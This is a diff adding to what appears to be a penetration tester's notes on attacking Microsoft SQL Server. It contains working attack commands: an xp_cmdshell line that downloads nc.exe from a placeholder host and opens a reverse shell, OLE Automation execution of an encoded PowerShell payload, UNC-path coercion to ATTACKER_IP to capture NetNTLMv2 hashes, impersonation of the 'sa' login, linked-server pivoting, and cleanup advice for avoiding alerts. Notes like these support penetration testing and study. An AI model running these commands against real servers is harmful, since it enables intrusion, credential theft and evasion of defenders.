@@ -75,3 +75,45 @@ Upgrade to a reverse shell by referring to this page [[Shells]] or use this one 
 ```sql
 EXECUTE xp_cmdshell "powershell.exe wget http://LOCAL_HOST:LOCAL_WEB_PORT/nc.exe -OutFile c:\\Users\Public\\nc.exe;"; EXECUTE xp_cmdshell "c:\\Users\Public\\nc.exe -e cmd.exe LOCAL_HOST LOCAL_LISTENER_PORT" --
 ```
+
+## OS command execution without xp_cmdshell (OLE Automation)
+
+If `xp_cmdshell` is disabled and cannot be re-enabled (policy-hardened), OLE Automation Procedures are a common fallback:
+```sql
+SQL> sp_configure 'show advanced options', 1; RECONFIGURE;
+SQL> sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;
+SQL> DECLARE @o INT;
+     EXEC sp_oacreate 'wscript.shell', @o OUT;
+     EXEC sp_oamethod @o, 'run', NULL, 'cmd /c powershell -e <BASE64_PAYLOAD>';
+```
+
+> [!Note]
+> Another route: `xp_dirtree`/`xp_fileexist` against a UNC path (`\\ATTACKER_IP\share`) forces the SQL service account to authenticate to us, letting us capture/relay its NetNTLMv2 hash — see [[NetNTLMv2]] and [[SMB Relay Attack]].
+
+## MSSQL links and impersonation (privilege escalation inside SQL)
+
+```sql
+-- Impersonate a higher-priv login if we hold IMPERSONATE rights
+SQL> EXECUTE AS LOGIN = 'sa'; SELECT SYSTEM_USER;
+
+-- Enumerate and pivot across linked servers (may run as sysadmin on the remote instance)
+SQL> SELECT srvname, isremote FROM master..sysservers;
+SQL> EXEC ('SELECT @@version; EXEC xp_cmdshell ''whoami'';') AT [LINKED_SERVER];
+```
+
+> [!Warning]
+> Cleanup / OPSEC: after finishing, disable what you enabled so you don't leave the instance in a weakened state and generate fewer alerts:
+> ```sql
+> SQL> EXECUTE sp_configure 'xp_cmdshell', 0; RECONFIGURE;
+> SQL> EXECUTE sp_configure 'Ole Automation Procedures', 0; RECONFIGURE;
+> SQL> EXECUTE sp_configure 'show advanced options', 0; RECONFIGURE;
+> ```
+
+---
+
+### Related notes
+- [[MSSQL]] — service-level enumeration and access (port 1433)
+- [[Impacket]] — `mssqlclient.py` / lateral movement to the host
+- [[NetNTLMv2]] / [[SMB Relay Attack]] — coercing and relaying the SQL service account
+- [[Kerberoasting]] — MSSQL service accounts frequently have SPNs and are roastable
+- [[Shells]] — upgrading `xp_cmdshell` execution to an interactive shell
